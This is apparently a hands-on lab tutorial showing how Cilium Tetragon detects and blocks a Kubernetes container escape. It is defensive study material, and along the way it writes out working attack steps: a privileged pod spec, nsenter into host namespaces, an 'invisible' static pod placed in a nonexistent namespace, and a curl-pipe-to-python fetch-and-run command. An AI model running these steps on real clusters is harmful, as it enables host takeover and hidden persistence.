The need for Security Observability

Security Observability in general is about providing more context into events involving an incident. We realize security observability by utilizing eBPF, a Linux kernel technology, to allow Security and DevOps teams, SREs, Cloud Engineers, and Solution Architects to gain real-time visibility into Kubernetes and workloads running on top of it. This helps them to secure their production environment.

Cilium Tetragon

Cilium Tetragon is an open source Security Observability and Runtime Enforcement tool from the makers of Cilium. It captures different process and network event types through a user-supplied configuration to enable Security Observability on arbitrary hook points in the kernel; then translates these events into actionable signals for a Security Team.
A Standalone Project: While Tetragon is part of the Cilium project, it does not require Cilium or Hubble to run.

Install the open source Cilium Tetragon:
kubectl get nodes

helm repo add cilium https://helm.cilium.io
helm repo update
helm install tetragon cilium/tetragon -n kube-system -f tetragon.yaml --version 1.1.0

Cilium Tetragon is running as a daemonset which implements the eBPF logic for extracting the Security Observability events as well as event filtering, aggregation and export to external event collectors.

Wait until the Tetragon daemonset is successfully rolled out.
kubectl rollout status -n kube-system ds/tetragon -w

TracingPolicy is a user-configurable Kubernetes custom resource definition (CRD) that allows you to trace arbitrary events in the kernel and define actions to take on match.

Monitor networking events and track network connections. In our case, we are going to observe tcp_connect, tcp_close and kernel functions to track when a TCP connection opens, closes respectively:

kubectl apply -f networking.yaml

Inspecting the Security Observability events 
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- tetra getevents -o compact

Detecting a container escape

This lab takes the first part of the Real World Attack out of the book and teaches you how to detect a container escape step by step. During the attack you will take advantage of a pod with an overly permissive configuration ("privileged" in Kubernetes) to enter into all the host namespaces with the nsenter command.

From there, you will write a static pod manifest in the /etc/kubernetes/manifests directory that will cause the kubelet to run that pod. Here you actually take advantage of a Kubernetes bug where you define a Kubernetes namespace that doesn’t exist for your static pod, which makes the pod invisible to the Kubernetes API server. This makes your stealthy pod invisible to kubectl commands.

After persisting the breakout by spinning up an invisible container, you are going to download and execute a malicious script in memory that never touches disk. Note that this simple python script represents a fileless malware which is almost impossible to detect by using traditional userspace tools.

Kubernetes allows this by default and the privileged flag grants the container all Linux capabilities and access to host namespaces. The hostPID and hostNetwork flags run the container in the host PID and networking namespaces respectively, so it can interact directly with all processes and network resources on the node.

root@server:~# cat sith-infiltrator.yaml 
apiVersion: v1
kind: Pod
metadata:
  name: sith-infiltrator
  labels:
    org: empire
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: sith-infiltrator
    image: nginx:latest
    ports:
    - containerPort: 80
    securityContext:
      privileged: true

Apply privileged pod spec:
kubectl apply -f sith-infiltrator.yaml

Inspecting the Security Observability events:
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- tetra getevents -o compact --pods sith-infiltrator
🚀 process default/sith-infiltrator /docker-entrypoint.d/20-envsubst-on-templates.sh /docker-entrypoint.d/20-envsubst-on-templates.sh 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/basename /docker-entrypoint.d/20-envsubst-on-templates.sh 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/basename /docker-entrypoint.d/20-envsubst-on-templates.sh 0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/awk  "END { for (name in ENVIRON) { print ( name ~ // ) ? name : "" } }" 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/awk  "END { for (name in ENVIRON) { print ( name ~ // ) ? name : "" } }" 0 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /docker-entrypoint.d/20-envsubst-on-templates.sh /docker-entrypoint.d/20-envsubst-on-templates.sh 0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /docker-entrypoint.d/30-tune-worker-processes.sh /docker-entrypoint.d/30-tune-worker-processes.sh 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/basename /docker-entrypoint.d/30-tune-worker-processes.sh 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/basename /docker-entrypoint.d/30-tune-worker-processes.sh 0 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /docker-entrypoint.d/30-tune-worker-processes.sh /docker-entrypoint.d/30-tune-worker-processes.sh 0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/sbin/nginx -g "daemon off;" 🛑 CAP_SYS_ADMIN

TracingPolicy is going to monitor the sys-setns system call, which is used by processes during changing kernel namespaces

kubectl apply -f sys-setns.yaml

Privileges escalation:
kubectl exec -it sith-infiltrator -- /bin/bash
nsenter -t 1 -a bash (Enter all namespaces(cgroup, ipc, uts, net, pid, mnt, time), target pid is 1)

Terminal 2: 
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon   -- tetra getevents -o compact --pods sith-infiltrator
🚀 process default/sith-infiltrator /usr/bin/nsenter -t 1 -a bash 🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter cgroup         🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter ipc            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter uts            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter net            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter pid            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter mnt            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter time           🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/bash          🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /bin/bash  0  🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /bin/bash              🛑 CAP_SYS_ADMIN


Cilium Tetragon provides an enforcement framework called TracingPolicy. TracingPolicy is a user-configurable Kubernetes custom resource definition (CRD) that allows you to trace arbitrary events in the kernel and define actions to take on match.

TracingPolicy is fully Kubernetes Identity Aware, so it can enforce on arbitrary kernel events and system calls after the Pod has reached a ready state. This allows you to prevent system calls that are required by the container runtime but should be restricted at application runtime. You can also make changes to the TracingPolicy that dynamically update the eBPF programs in the kernel without needing to restart your application or node.

Once there is an event triggered by a TracingPolicy and the corresponding signature, you can either send an alert to a Security Analyst or prevent the behaviour with a SIGKILL signal to the process.

To be able to detect creating an invisible Pod, we will need to apply the third TracingPolicy. This TracingPolicy is going to be used to monitor read and write access to sensitive files. In our case, we are going to observe the __x64_sys_write and __x64_sys_read system calls which are executed on the files under the /etc/kubernetes/manifests directory

In terminal 2:
kubectl apply -f sys-write-etc-kubernetes-manifests.yaml


In terminal 1: monitor the generated Security Observability events
kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --pods sith-infiltrator

In terminal 2: 
kubectl exec -it sith-infiltrator -- /bin/bash
nsenter -t 1 -a bash
cd /etc/kubernetes/manifests/
ls -la

Create invisible pod template in /etc/kubernetes/manifests/:

cat << EOF > hack-latest.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hack-latest
  hostNetwork: true
  # define in namespace that doesn't exist so
  # workload is invisible to the API server
  namespace: doesnt-exist
spec:
  containers:
  - name: hack-latest
    image: sublimino/hack:latest
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 10;done"]
    securityContext:
      privileged: true
EOF

crictl ps

In termincal 3: pod hack-latest doesn't show:
kubectl get pods --all-namespaces

In terminal 1:
root@server:~# kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon --   tetra getevents -o compact --pods sith-infiltrator
💥 exit    default/sith-infiltrator /usr/local/bin/crictl ps 0 🛑 CAP_SYS_ADMIN


Execute a malicious python script in memory:
We have persisted the breakout by spinning up an invisible container, now we can download and execute a malicious script in memory that never touches disk.
For this we are using a simple python script as a fileless malware which is almost impossible to detect by using traditional userspace tools.

Monitor the generated Security Observability events T1:
root@server:~# kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --pods sith-infiltrator
🚀 process default/sith-infiltrator /bin/bash              🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/nsenter -t 1 -a bash 🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter cgroup         🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter ipc            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter uts            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter net            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter pid            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter mnt            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter time           🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/bash          🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/local/bin/crictl ps --name hack-latest --output json 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/jq -r .containers[0].id 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/local/bin/crictl ps --name hack-latest --output json 0 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/jq -r .containers[0].id 0 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/bash  0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/local/bin/crictl ps --name hack-latest --output json 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/jq -r .containers[0].id 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/local/bin/crictl ps --name hack-latest --output json 0 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/jq -r .containers[0].id 0 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/bash  0 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/local/bin/crictl exec -it 2a39e8d112cacdff4a302e7311a5c861ba7ad0e479ff770fff051d623d7db290 /bin/bash 🛑 CAP_SYS_ADMIN
🔌 connect default/sith-infiltrator /usr/local/bin/crictl tcp 127.0.0.1:40172 -> 127.0.0.1:37139 🛑 CAP_SYS_ADMIN


Enter to the sith-infiltrator T3:
kubectl exec -it sith-infiltrator -- /bin/bash
nsenter -t 1 -a bash

CONT_ID=$(crictl ps --name hack-latest --output json | jq -r '.containers[0].id')
echo $CONT_ID
2a39e8d112cacdff4a302e7311a5c861ba7ad0e479ff770fff051d623d7db290
crictl exec -it $CONT_ID /bin/bash

T2:monitoring the events that match process names curl or python
root@server:~# kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon -- \
  tetra getevents -o compact --processes curl,python
🚀 process kind-control-plane /usr/bin/curl https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py 🛑 CAP_SYS_ADMIN
🚀 process kind-control-plane /usr/bin/python              🛑 CAP_SYS_ADMIN
🔌 connect kind-control-plane /usr/bin/curl tcp 10.244.0.9:34308 -> 185.199.109.133:443 🛑 CAP_SYS_ADMIN
🧹 close   kind-control-plane /usr/bin/curl tcp 10.244.0.9:34308 -> 185.199.109.133:443 🛑 CAP_SYS_ADMIN
💥 exit    kind-control-plane /usr/bin/curl https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py 0 🛑 CAP_SYS_ADMIN
💥 exit    kind-control-plane /usr/bin/python  0  🛑 CAP_SYS_ADMIN

T3: curl https://raw.githubusercontent.com/realpython/python-scripts/master/scripts/18_zipper.py | python

File monitoring Enforcement:
kubectl apply -f sys-write-etc-kubernetes-manifests.yaml

Observe events:
root@server:~# kubectl exec -n kube-system -ti daemonset/tetragon -c tetragon --   tetra getevents -o compact --pods sith-infiltrator
💥 exit    default/sith-infiltrator /usr/bin/bash  2 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/nsenter -t 1 -a bash 2 🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/nsenter -t 1 -a bash 🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter cgroup         🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter ipc            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter uts            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter net            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter pid            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter mnt            🛑 CAP_SYS_ADMIN
🔧 setns   default/sith-infiltrator /usr/bin/nsenter time           🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/bash          🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /usr/bin/ls -la        🛑 CAP_SYS_ADMIN
📚 read    default/sith-infiltrator /usr/bin/ls /etc/kubernetes/manifests 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /usr/bin/ls -la 2 🛑 CAP_SYS_ADMIN
💥 exit    default/sith-infiltrator /bin/bash  2  🛑 CAP_SYS_ADMIN
🚀 process default/sith-infiltrator /bin/bash              🛑 CAP_SYS_ADMIN


Exec pod in other terminal:
root@server:~# kubectl exec -it sith-infiltrator -- /bin/bash
root@kind-control-plane:/# nsenter -t 1 -a bash
root@kind-control-plane:/# cd /etc/kubernetes/manifests/
ls -la
ls: reading directory '.': Operation not permitted
total 0
root@kind-control-plane:/etc/kubernetes/manifests# 
exit
root@kind-control-plane:/# 
exit
command terminated with exit code 2
root@server:~# kubectl exec -it sith-infiltrator -- /bin/bash
root@kind-control-plane:/# nsenter -t 1 -a bash
root@kind-control-plane:/# cd /etc/kubernetes/manifests/
root@kind-control-plane:/etc/kubernetes/manifests# ls -la
ls: reading directory '.': Operation not permitted
total 0
root@kind-control-plane:/etc/kubernetes/manifests# 

imilar rules could be written to:

    block binary execution by command name (to avoid the curl for example)
    prevent the original NS escape that allowed access to the host namespace
    etc.
